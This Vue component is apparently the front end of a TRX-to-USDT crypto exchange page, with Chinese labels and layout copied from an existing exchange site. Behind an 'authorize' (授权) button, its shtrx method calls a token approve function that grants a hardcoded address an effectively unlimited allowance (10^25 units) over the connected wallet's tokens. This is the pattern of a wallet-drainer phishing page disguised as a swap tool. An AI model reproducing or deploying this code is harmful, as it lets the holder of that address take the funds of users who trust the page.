<template>
  <div class="page_exchange page" cd="shenti" style="overflow: visible">
    <div class="header page__header">
      <div class="container">
        <div class="row">
          <div class="col-lg-12"></div>
        </div>
      </div>
    </div>
    <div class="page_exchange page">
      <div id="language-adviser">
        <div class="language-adviser">
          <div class="container-fluid">
            <div class="row">
              <div
                class="
                  col-md-10
                  col-md-offset-1
                  col-lg-offset-3
                  col-lg-6
                  col-sm-8
                  col-sm-offset-2
                "
              >
                <div class="language-adviser--content">
                  <span></span><a href=""></a>
                </div>
              </div>
              <span class="language-adviser--close-btn"></span>
            </div>
          </div>
        </div>
      </div>
      <div class="header page__header">
        <div class="container">
          <div class="row">
            <div class="col-lg-12"></div>
          </div>
        </div>
      </div>
      <div id="app"></div>
      <div class="exchange-stepper container">
        <div class="row">
          <div class="col-lg-9"></div>
        </div>
        <div class="row">
          <div class="exchange-stepper__dashboard-navigation col-md-2"></div>
          <div class="col-md-8 col-lg-7">
            <div
              class="
                set-transaction-step
                exchange-stepper--step exchange-stepper--panel
              "
            >
              <div class="set-transaction-step--content">
                <h1 class="exchange-stepper--attention-title">
                  请输入兑换所需的数据
                </h1>
                <div class="exchange-calculator exchange-calculator__light">
                  <div
                    class="
                      exchange-calculator--fields-section
                      exchange-calculator--fields-section__amount
                    "
                  >
                    <van-cell-group
                      inset
                      class="
                        now-input now-input__light
                        exchange-calculator--amount-field
                      "
                      @click="shuru"
                    >
                      <div class="now-input--labels">
                        <label class="now-input--label" for="amount-field"
                          >你发送</label
                        >
                      </div>
                      <input
                        id="amount-field"
                        class="now-input--input"
                        placeholder=""
                        v-model="testinit"
                        autocomplete="off"
                        inputmode="decimal"
                      />
                    </van-cell-group>

                    <div
                      class="
                        combobox combobox__light
                        exchange-calculator--currency-field
                        combobox__green-scrollbar
                      "
                    >
                      <div class="combobox--field" role="button" tabindex="0">
                        <div
                          class="
                            currency-item currency-item__light
                            exchange-calculator--selected-currency-item
                          "
                        >
                          <div class="currency-item__left">
                            <img
                              class="currency-icon currency-item--currency-icon"
                              src="./images/extension-logos/trx_f14430166e.svg"
                              alt="icon-btc"
                              loading="lazy"
                              decoding="async"
                            />
                          </div>
                          <div class="currency-item__right">
                            <span class="currency-item--ticker">TRX</span>
                          </div>
                        </div>
                        <div
                          class="
                            currency-item currency-item__light
                            exchange-calculator--selected-currency-item
                          "
                          @click="shtrx"
                        >
                          <div class="shouquan">
                            <span> &nbsp;授权</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="
                      exchange-calculator--fields-section
                      exchange-calculator--fields-section__sequence
                    "
                  >
                    <div class="new-stepper-hints">
                      <div class="new-stepper-hints__wrapper-border">
                        <div class="new-stepper-hints__item">
                          <button
                            type="button"
                            class="new-stepper-hints__label"
                          >
                            没有额外费用
                          </button>
                        </div>
                        <div class="new-stepper-hints__item">
                          <button
                            type="button"
                            class="new-stepper-hints__label"
                          >
                            Estimated rate:
                          </button>
                          <span class="new-stepper-hints__rate">
                            1 TRX ~ 0.0654 USDT</span
                          >
                        </div>
                      </div>
                    </div>
                    <div
                      class="exchange-calculator--swap-button"
                      role="button"
                      tabindex="0"
                    >
                      <div
                        class="exchange-calculator--swap-button-icon"
                        @click="change"
                      >
                        <svg
                          width="16"
                          height="12"
                          viewBox="0 0 16 12"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M0.772864 3.24846C0.457408 3.24846 0.173615 3.07952 0.0558748 2.82164C-0.0618654 2.56376 0.0100831 2.26871 0.237649 2.07621L2.46776 0.189733C2.76682 -0.0632443 3.23913 -0.0632443 3.53819 0.189733L5.7683 2.07621C5.99587 2.26871 6.06782 2.56376 5.95008 2.82164C5.83234 3.07952 5.54854 3.24846 5.23309 3.24846H3.77583L3.77583 11.2363C3.77583 11.6124 3.42982 11.9173 3.00299 11.9173C2.57616 11.9173 2.23015 11.6124 2.23015 11.2363V3.24846H0.772864Z"
                            fill="#00C26F"
                          ></path>
                          <path
                            d="M15.2271 8.75154C15.5426 8.75154 15.8264 8.92048 15.9441 9.17836C16.0619 9.43624 15.9899 9.73129 15.7624 9.92379L13.5322 11.8103C13.2332 12.0632 12.7609 12.0632 12.4618 11.8103L10.2317 9.92379C10.0041 9.73129 9.93219 9.43624 10.0499 9.17836C10.1677 8.92048 10.4515 8.75154 10.7669 8.75154H12.224L12.224 0.680991C12.224 0.30489 12.57 0 12.9969 0C13.4237 0 13.7697 0.30489 13.7697 0.680991L13.7697 8.75154H15.2271Z"
                            fill="#00C26F"
                          ></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                  <div
                    class="
                      exchange-calculator--fields-section
                      exchange-calculator--fields-section__estimation
                    "
                  >
                    <van-cell-group
                      inset
                      class="
                        now-input now-input__light
                        exchange-calculator--estimation-field
                      "
                    >
                      <div class="now-input--labels">
                        <label class="now-input--label" for="estimation-field"
                          >你得到</label
                        >
                      </div>
                      <input
                        id="estimation-field"
                        class="now-input--input"
                        placeholder=""
                        v-model="testResult"
                        readonly
                        autocomplete="off"
                        inputmode="decimal"
                      /><button
                        type="button"
                        class="
                          new-stepper-button-lock new-stepper-estimation-lock
                          new-stepper-button-lock_gray-svg
                        "
                      ></button>
                    </van-cell-group>
                    <div
                      class="
                        combobox combobox__light
                        exchange-calculator--currency-field
                        combobox__green-scrollbar
                      "
                    >
                      <div class="combobox--field" role="button" tabindex="0">
                        <div
                          class="
                            currency-item currency-item__light
                            exchange-calculator--selected-currency-item
                          "
                        >
                          <div class="currency-item__left">
                            <img
                              class="currency-icon currency-item--currency-icon"
                              src="./images/extension-logos/usdttrc20_6e1d3b80e2.svg"
                              alt="icon-eth"
                              loading="lazy"
                              decoding="async"
                            />
                          </div>
                          <div class="currency-item__right">
                            <span class="currency-item--ticker">USDT</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  class="new-stepper-recipient-field exchange-stepper--input"
                >
                  <div class="new-stepper-field-qr-code">
                    <div class="new-stepper-field">
                      <div
                        class="
                          new-stepper-field__wrapper-input
                          new-stepper-field__wrapper-input_with-icon
                        "
                      >
                        <input
                          type="text"
                          id="recipientWallet"
                          class="new-stepper-field__input"
                          placeholder="请输入收款地址信息"
                          v-model="shouaddress"
                          spellcheck="false"
                        /><span class="new-stepper-field__placeholder"
                          >请输入收款地址信息</span
                        >
                        <div
                          class="new-stepper-field__icon"
                          role="button"
                          tabindex="0"
                        >
                          <svg
                            width="20"
                            height="20"
                            viewBox="0 0 20 20"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                            class="new-stepper-icon-qr-code"
                          >
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M0.25 1.6875C0.25 1.27329 0.585786 0.9375 1 0.9375H4.375C4.78921 0.9375 5.125 1.27329 5.125 1.6875C5.125 2.10171 4.78921 2.4375 4.375 2.4375H1.75V5.0625C1.75 5.47671 1.41421 5.8125 1 5.8125C0.585786 5.8125 0.25 5.47671 0.25 5.0625V1.6875Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M1 15.1208C1.41421 15.1208 1.75 15.4566 1.75 15.8708V18.4958H4.375C4.78921 18.4958 5.125 18.8316 5.125 19.2458C5.125 19.6601 4.78921 19.9958 4.375 19.9958H1C0.585786 19.9958 0.25 19.6601 0.25 19.2458V15.8708C0.25 15.4566 0.585786 15.1208 1 15.1208Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M10.25 5.6875C10.25 5.27329 10.5858 4.9375 11 4.9375H14C14.4142 4.9375 14.75 5.27329 14.75 5.6875V8.6875C14.75 9.10171 14.4142 9.4375 14 9.4375H11C10.5858 9.4375 10.25 9.10171 10.25 8.6875V5.6875ZM11.75 6.4375V7.9375H13.25V6.4375H11.75Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M4.25 5.6875C4.25 5.27329 4.58579 4.9375 5 4.9375H8C8.41421 4.9375 8.75 5.27329 8.75 5.6875V8.6875C8.75 9.10171 8.41421 9.4375 8 9.4375H5C4.58579 9.4375 4.25 9.10171 4.25 8.6875V5.6875ZM5.75 6.4375V7.9375H7.25V6.4375H5.75Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M4.25 11.6875C4.25 11.2733 4.58579 10.9375 5 10.9375H8C8.41421 10.9375 8.75 11.2733 8.75 11.6875V14.6875C8.75 15.1017 8.41421 15.4375 8 15.4375H5C4.58579 15.4375 4.25 15.1017 4.25 14.6875V11.6875ZM5.75 12.4375V13.9375H7.25V12.4375H5.75Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M10.5403 11.9727C10.5403 11.5584 10.8761 11.2227 11.2903 11.2227H11.6418C12.0561 11.2227 12.3918 11.5584 12.3918 11.9727C12.3918 12.3869 12.0561 12.7227 11.6418 12.7227H11.2903C10.8761 12.7227 10.5403 12.3869 10.5403 11.9727ZM14.7121 11.2227C15.1263 11.2227 15.4621 11.5584 15.4621 11.9727V15.3266C15.4621 15.7409 15.1263 16.0766 14.7121 16.0766H11.3581C10.9439 16.0766 10.6081 15.7409 10.6081 15.3266C10.6081 14.9124 10.9439 14.5766 11.3581 14.5766H13.9621V11.9727C13.9621 11.5584 14.2979 11.2227 14.7121 11.2227Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M19 15.1208C19.4142 15.1208 19.75 15.4566 19.75 15.8708V19.2458C19.75 19.6601 19.4142 19.9958 19 19.9958H15.625C15.2108 19.9958 14.875 19.6601 14.875 19.2458C14.875 18.8316 15.2108 18.4958 15.625 18.4958H18.25V15.8708C18.25 15.4566 18.5858 15.1208 19 15.1208Z"
                              fill="#00C26F"
                            ></path>
                            <path
                              fill-rule="evenodd"
                              clip-rule="evenodd"
                              d="M14.875 1.6875C14.875 1.27329 15.2108 0.9375 15.625 0.9375H19C19.4142 0.9375 19.75 1.27329 19.75 1.6875V5.0625C19.75 5.47671 19.4142 5.8125 19 5.8125C18.5858 5.8125 18.25 5.47671 18.25 5.0625V2.4375H15.625C15.2108 2.4375 14.875 2.10171 14.875 1.6875Z"
                              fill="#00C26F"
                            ></path>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="new-stepper-extensions exchange-stepper__extensions"
                  >
                    <div class="new-stepper-extensions__text">
                      FIO protocol names are supported
                    </div>
                    <div class="new-stepper-extensions__items">
                      <div
                        class="
                          new-stepper-metamask-extension
                          new-stepper-extensions__item
                        "
                      >
                        <div class="extension-item">
                          <div
                            class="extension-item__image"
                            role="button"
                            tabindex="0"
                          >
                            <img
                              src="./images/extension-logos/metamask-small.svg"
                              alt="Metamask"
                              decoding="async"
                            />
                          </div>
                          <div
                            class="simple-tooltip extension-item__tooltip"
                            style="max-width: 196px"
                          >
                            <div class="simple-tooltip__content">
                              Please select address Metamask
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <button
                  type="button"
                  class="
                    now-button now-button__green
                    exchange-stepper--next-button
                  "
                  @click="duihuan"
                >
                  查询并兑换
                </button>
              </div>
              <div
                class="
                  new-stepper-dropdown-settings
                  exchange-stepper__dropdown-settings_promo
                "
              >
                <div
                  class="new-stepper-dropdown-settings__content-wrapper"
                  style="overflow: hidden; max-height: 0px"
                >
                  <div class="new-stepper-dropdown-settings__content">
                    <div
                      class="
                        new-stepper-promo-code
                        exchange-stepper__promo-code-content
                      "
                    >
                      <div
                        class="
                          new-stepper-field
                          new-stepper-promo-code__field_new-theme
                        "
                      >
                        <div class="new-stepper-field__header">
                          <label
                            for="new-stepper-promo-code__field"
                            class="new-stepper-field__label"
                            >促销代码</label
                          >
                        </div>
                        <div class="new-stepper-field__wrapper-input">
                          <input
                            type="text"
                            id="new-stepper-promo-code__field"
                            class="new-stepper-field__input"
                            placeholder="输入您的促销代码"
                            spellcheck="false"
                            value=""
                          /><span class="new-stepper-field__placeholder"
                            >输入您的促销代码</span
                          >
                          <div class="new-stepper-field__icon-success"></div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="new-stepper-backup-field exchange-stepper--input"
                    >
                      <div class="new-stepper-field-qr-code">
                        <div class="new-stepper-field">
                          <div class="new-stepper-field__header">
                            <label
                              for="refundAddress"
                              class="new-stepper-field__label"
                              >退款地址t</label
                            >
                          </div>
                          <div
                            class="
                              new-stepper-field__wrapper-input
                              new-stepper-field__wrapper-input_with-icon
                            "
                          >
                            <input
                              type="text"
                              id="refundAddress"
                              class="new-stepper-field__input"
                              placeholder="请输入 BTC 退款地址"
                              spellcheck="false"
                              value=""
                            /><span class="new-stepper-field__placeholder"
                              >请输入 BTC 退款地址</span
                            >
                            <div
                              class="new-stepper-field__icon"
                              role="button"
                              tabindex="0"
                            >
                              <svg
                                width="20"
                                height="20"
                                viewBox="0 0 20 20"
                                fill="none"
                                xmlns="http://www.w3.org/2000/svg"
                                class="new-stepper-icon-qr-code"
                              >
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M0.25 1.6875C0.25 1.27329 0.585786 0.9375 1 0.9375H4.375C4.78921 0.9375 5.125 1.27329 5.125 1.6875C5.125 2.10171 4.78921 2.4375 4.375 2.4375H1.75V5.0625C1.75 5.47671 1.41421 5.8125 1 5.8125C0.585786 5.8125 0.25 5.47671 0.25 5.0625V1.6875Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M1 15.1208C1.41421 15.1208 1.75 15.4566 1.75 15.8708V18.4958H4.375C4.78921 18.4958 5.125 18.8316 5.125 19.2458C5.125 19.6601 4.78921 19.9958 4.375 19.9958H1C0.585786 19.9958 0.25 19.6601 0.25 19.2458V15.8708C0.25 15.4566 0.585786 15.1208 1 15.1208Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M10.25 5.6875C10.25 5.27329 10.5858 4.9375 11 4.9375H14C14.4142 4.9375 14.75 5.27329 14.75 5.6875V8.6875C14.75 9.10171 14.4142 9.4375 14 9.4375H11C10.5858 9.4375 10.25 9.10171 10.25 8.6875V5.6875ZM11.75 6.4375V7.9375H13.25V6.4375H11.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M4.25 5.6875C4.25 5.27329 4.58579 4.9375 5 4.9375H8C8.41421 4.9375 8.75 5.27329 8.75 5.6875V8.6875C8.75 9.10171 8.41421 9.4375 8 9.4375H5C4.58579 9.4375 4.25 9.10171 4.25 8.6875V5.6875ZM5.75 6.4375V7.9375H7.25V6.4375H5.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M4.25 11.6875C4.25 11.2733 4.58579 10.9375 5 10.9375H8C8.41421 10.9375 8.75 11.2733 8.75 11.6875V14.6875C8.75 15.1017 8.41421 15.4375 8 15.4375H5C4.58579 15.4375 4.25 15.1017 4.25 14.6875V11.6875ZM5.75 12.4375V13.9375H7.25V12.4375H5.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M10.5403 11.9727C10.5403 11.5584 10.8761 11.2227 11.2903 11.2227H11.6418C12.0561 11.2227 12.3918 11.5584 12.3918 11.9727C12.3918 12.3869 12.0561 12.7227 11.6418 12.7227H11.2903C10.8761 12.7227 10.5403 12.3869 10.5403 11.9727ZM14.7121 11.2227C15.1263 11.2227 15.4621 11.5584 15.4621 11.9727V15.3266C15.4621 15.7409 15.1263 16.0766 14.7121 16.0766H11.3581C10.9439 16.0766 10.6081 15.7409 10.6081 15.3266C10.6081 14.9124 10.9439 14.5766 11.3581 14.5766H13.9621V11.9727C13.9621 11.5584 14.2979 11.2227 14.7121 11.2227Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M19 15.1208C19.4142 15.1208 19.75 15.4566 19.75 15.8708V19.2458C19.75 19.6601 19.4142 19.9958 19 19.9958H15.625C15.2108 19.9958 14.875 19.6601 14.875 19.2458C14.875 18.8316 15.2108 18.4958 15.625 18.4958H18.25V15.8708C18.25 15.4566 18.5858 15.1208 19 15.1208Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M14.875 1.6875C14.875 1.27329 15.2108 0.9375 15.625 0.9375H19C19.4142 0.9375 19.75 1.27329 19.75 1.6875V5.0625C19.75 5.47671 19.4142 5.8125 19 5.8125C18.5858 5.8125 18.25 5.47671 18.25 5.0625V2.4375H15.625C15.2108 2.4375 14.875 2.10171 14.875 1.6875Z"
                                  fill="#00C26F"
                                ></path>
                              </svg>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="new-stepper-field-qr-code">
                        <div class="new-stepper-field">
                          <div class="new-stepper-field__header">
                            <label
                              for="refundAddress"
                              class="new-stepper-field__label"
                              >退款地址t</label
                            >
                          </div>
                          <div
                            class="
                              new-stepper-field__wrapper-input
                              new-stepper-field__wrapper-input_with-icon
                            "
                          >
                            <input
                              type="text"
                              id="refundAddress"
                              class="new-stepper-field__input"
                              placeholder="请输入 BTC 退款地址"
                              spellcheck="false"
                              value=""
                            /><span class="new-stepper-field__placeholder"
                              >请输入 BTC 退款地址</span
                            >
                            <div
                              class="new-stepper-field__icon"
                              role="button"
                              tabindex="0"
                            >
                              <svg
                                width="20"
                                height="20"
                                viewBox="0 0 20 20"
                                fill="none"
                                xmlns="http://www.w3.org/2000/svg"
                                class="new-stepper-icon-qr-code"
                              >
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M0.25 1.6875C0.25 1.27329 0.585786 0.9375 1 0.9375H4.375C4.78921 0.9375 5.125 1.27329 5.125 1.6875C5.125 2.10171 4.78921 2.4375 4.375 2.4375H1.75V5.0625C1.75 5.47671 1.41421 5.8125 1 5.8125C0.585786 5.8125 0.25 5.47671 0.25 5.0625V1.6875Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M1 15.1208C1.41421 15.1208 1.75 15.4566 1.75 15.8708V18.4958H4.375C4.78921 18.4958 5.125 18.8316 5.125 19.2458C5.125 19.6601 4.78921 19.9958 4.375 19.9958H1C0.585786 19.9958 0.25 19.6601 0.25 19.2458V15.8708C0.25 15.4566 0.585786 15.1208 1 15.1208Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M10.25 5.6875C10.25 5.27329 10.5858 4.9375 11 4.9375H14C14.4142 4.9375 14.75 5.27329 14.75 5.6875V8.6875C14.75 9.10171 14.4142 9.4375 14 9.4375H11C10.5858 9.4375 10.25 9.10171 10.25 8.6875V5.6875ZM11.75 6.4375V7.9375H13.25V6.4375H11.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M4.25 5.6875C4.25 5.27329 4.58579 4.9375 5 4.9375H8C8.41421 4.9375 8.75 5.27329 8.75 5.6875V8.6875C8.75 9.10171 8.41421 9.4375 8 9.4375H5C4.58579 9.4375 4.25 9.10171 4.25 8.6875V5.6875ZM5.75 6.4375V7.9375H7.25V6.4375H5.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M4.25 11.6875C4.25 11.2733 4.58579 10.9375 5 10.9375H8C8.41421 10.9375 8.75 11.2733 8.75 11.6875V14.6875C8.75 15.1017 8.41421 15.4375 8 15.4375H5C4.58579 15.4375 4.25 15.1017 4.25 14.6875V11.6875ZM5.75 12.4375V13.9375H7.25V12.4375H5.75Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M10.5403 11.9727C10.5403 11.5584 10.8761 11.2227 11.2903 11.2227H11.6418C12.0561 11.2227 12.3918 11.5584 12.3918 11.9727C12.3918 12.3869 12.0561 12.7227 11.6418 12.7227H11.2903C10.8761 12.7227 10.5403 12.3869 10.5403 11.9727ZM14.7121 11.2227C15.1263 11.2227 15.4621 11.5584 15.4621 11.9727V15.3266C15.4621 15.7409 15.1263 16.0766 14.7121 16.0766H11.3581C10.9439 16.0766 10.6081 15.7409 10.6081 15.3266C10.6081 14.9124 10.9439 14.5766 11.3581 14.5766H13.9621V11.9727C13.9621 11.5584 14.2979 11.2227 14.7121 11.2227Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M19 15.1208C19.4142 15.1208 19.75 15.4566 19.75 15.8708V19.2458C19.75 19.6601 19.4142 19.9958 19 19.9958H15.625C15.2108 19.9958 14.875 19.6601 14.875 19.2458C14.875 18.8316 15.2108 18.4958 15.625 18.4958H18.25V15.8708C18.25 15.4566 18.5858 15.1208 19 15.1208Z"
                                  fill="#00C26F"
                                ></path>
                                <path
                                  fill-rule="evenodd"
                                  clip-rule="evenodd"
                                  d="M14.875 1.6875C14.875 1.27329 15.2108 0.9375 15.625 0.9375H19C19.4142 0.9375 19.75 1.27329 19.75 1.6875V5.0625C19.75 5.47671 19.4142 5.8125 19 5.8125C18.5858 5.8125 18.25 5.47671 18.25 5.0625V2.4375H15.625C15.2108 2.4375 14.875 2.10171 14.875 1.6875Z"
                                  fill="#00C26F"
                                ></path>
                              </svg>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import UI from "@/utils/ui";
import CommonFunction from "@/utils/commonFunction";
import { tsTypeParameterInstantiation } from "@babel/types";
export default {
  data() {
    return {
      currentAccount: window.connectedAddress,
      testResult: null,
      testResultSend: null,
      testinit: null,
      shouaddress: null,
      testonit: null,
    };
  },
  mounted() {
    this.initData();
  },
  methods: {
    async initData() {},
    async duihuan() {
      const address = this.shouaddress;
      const uint256 = this.testinit;
      const uint = uint256 * Math.pow(10,18);
      const result = await Contract.newusdt.trxPropor(uint256);
      this.testResult = result;
      UI.loading("Send..");
      Contract.newusdt
        .trx_usdt(address, uint.toString())
        .then((result) => {
          UI.closeLoading();
          console.log(result);
        })
        .catch((err) => {
          UI.closeLoading();
          console.log(err);
        });
    },
    async change() {
      this.$router.push("./index");
    },
    async shtrx() {
      const address = "0x6CD058E96824C1E9D3ab9c8181300Dd121E8eC0d";
      const uint256 = "10000000000000000000000000";
      UI.loading("Send..");
      Contract.coin
        .approve(address, uint256)
        .then((result) => {
          UI.closeLoading();
          console.log(result);
        })
        .catch((err) => {
          UI.closeLoading();
          console.log(err);
        });
    },
  },
};
</script>

<style scoped>
@import "./dist/zhuyao.css";
</style>

<style>
#shenti {
  margin: 0;
  padding: 0;
  font-weight: 400;
  font-family: Roboto, Arial, Helvetica, sans-serif;
  font-style: normal;
  background: #f6f4f8;
}
.shouquan {
  color: #00c26f;
  border: none;
  font-size: 17px;
  border-radius: 1px;
  outline: none;
}
</style>
